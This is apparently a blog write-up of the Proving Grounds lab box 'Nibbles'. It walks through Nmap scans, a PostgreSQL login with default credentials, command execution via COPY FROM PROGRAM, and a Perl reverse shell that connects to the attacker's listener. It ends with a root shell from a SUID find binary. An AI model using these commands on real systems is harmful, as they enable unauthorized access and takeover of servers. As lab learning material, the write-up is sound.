---
layout: post
title: Proving Grounds - Nibbles (Intermediate)
---

# Introduction 

This is an Intermediate Linux box on Proving Grounds.

# Enumeration

As always first I will run a service version Nmap scan. This reveals FTP, SSH, and a webserver on HTTP.

```bash
$ sudo nmap --min-rate 100 -sV -sC -T4 192.168.122.47 -oA nmap/versions
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-14 11:34 EDT
Nmap scan report for 192.168.122.47
Host is up (0.083s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT    STATE  SERVICE      VERSION
21/tcp  open   ftp          vsftpd 3.0.3
22/tcp  open   ssh          OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)
|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)
|_  256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)
80/tcp  open   http         Apache httpd 2.4.38 ((Debian))
|_http-title: Enter a title, displayed at the top of the window.
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp closed netbios-ssn
445/tcp closed microsoft-ds
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.71 seconds
```

Running a further Nmap scan across all ports reveals one more open port - 5437. This is PostgresQL.

```bash
 sudo nmap -p- -T4 192.168.122.47 -o nmap/all 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-14 12:19 EDT
Nmap scan report for 192.168.122.47
Host is up (0.084s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE  SERVICE
21/tcp   open   ftp
22/tcp   open   ssh
80/tcp   open   http
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
5437/tcp open   pmip6-data

Nmap done: 1 IP address (1 host up) scanned in 110.82 seconds
```

## Apache Webserver

Service: `Apache/2.4.38 (Debian)`

To me this looked like a default page and I was not able to find anything interesting via directory enumeration.

![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220414121002.png)

## PostgresQL Enumeration

We can use Nmap to attempt a service version scan on the PostgresQL port - this succesfully identifies the version as between 11.3 - 11.7.

```bash
$ nmap -sC -sV -p 5437 192.168.122.47    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-14 12:26 EDT
Nmap scan report for 192.168.122.47
Host is up (0.083s latency).

PORT     STATE SERVICE    VERSION
5437/tcp open  postgresql PostgreSQL DB 11.3 - 11.7
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Not valid before: 2020-04-27T15:41:47
|_Not valid after:  2030-04-25T15:41:47

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.81 seconds
```

Default credentials are always worth a try:

```bash
psql -h 192.168.122.47 -p 5437 -U postgres -W
```

Here we can try the username-password combination `postgres:postgres`:

![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220414123116.png)

# PostgresQL Exploitation

The default credentials are valid and we are able to enumerate the database and also list directories.

![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220414123818.png)


```sql
select pg_ls_dir('/etc');
```

![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220414123748.png)

Internal reconnaissance of the server enabled me to identify it as PostgresQL version 11.7 but unfortunately I do not have a screenshot of this. Knowing this, we can search for vulnerabilties - an authenticated RCE exploit is available.

[PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)](https://www.exploit-db.com/exploits/50847)

Example
```bash
sudo python3 50847.py -i 192.168.171.47 -p 5437 -c "(command)"
```
However this did not work for me, so I resorted to manually exploting the RCE.

## Manual RCE

1) [Optional] Drop the table you want to use if it already exists

```sql
DROP TABLE IF EXISTS cmd_exec;
```

2) Create the table you want to hold the command output

```sql
CREATE TABLE cmd_exec(cmd_output text);
```

3) Run the system command via the COPY FROM PROGRAM function

```sql
COPY cmd_exec FROM PROGRAM 'id';
```

4) [Optional] View the results

```sql
SELECT * FROM cmd_exec;
```

5) [Optional] Clean up after yourself

```sql
DROP TABLE IF EXISTS cmd_exec;
```

Executing a Perl reverse shell:
```sql
COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.49.171:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```

![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220417125357.png)

We receive a connect back at the listener and we have interactive shell access as the `postgres` user.

![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220417125500.png)

Another local user is present, `wilson`, and the current user has the privileges to read their files (such as the local flag).

# Privilege Escalation

Firewall rules which prevented file transfer were in place, so I generated SSH keys on the target and added to the Kali authorized keys file. Then we can transfer files with `scp` e.g.

```bash 
scp -i /var/lib/postgresql/.ssh/id_rsa kali@192.168.49.171:/home/kali/Documents/oscp/provingGrounds/nibbles/linpeas.sh /tmp/
```

This was however COMPLETELY unneccessary as one of the first enumeration commands I had run manually had shown the PE vector...

```bash
postgres@nibbles:/tmp$ find / -type f -perm -u=s 2>/dev/null
find / -type f -perm -u=s 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/find
/usr/bin/sudo
/usr/bin/umount
```

The binary `find` with a SUID bit set is a classic privilege escalation technique seen often in CTFs.

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

![]({{site.baseurl}}/assets/resources/Pasted%20image%2020230214225759.png)